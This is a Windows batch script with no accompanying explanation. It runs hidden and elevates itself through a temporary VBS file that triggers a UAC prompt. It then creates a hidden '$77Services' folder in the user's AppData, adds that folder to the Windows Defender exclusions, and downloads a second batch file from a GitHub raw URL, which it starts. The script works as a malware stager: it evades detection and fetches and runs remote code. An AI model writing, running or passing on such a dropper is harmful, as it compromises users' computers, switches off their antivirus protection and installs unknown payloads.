��&cls
@echo off

powershell -window hidden -command ""
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

cd "C:\Users\%USERNAME%\AppData\Local"
mkdir "$77Services"
attrib +h "$77Services" /s /d

powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Users\%USERNAME%\AppData\Local\$77Services

cd "C:\Users\%USERNAME%\AppData\Local\$77Services"
Powershell -Command "Invoke-Webrequest 'https://github.com/ThisNot7/test-security-defender/raw/main/2.bat' -OutFile 2.bat"

start 2.bat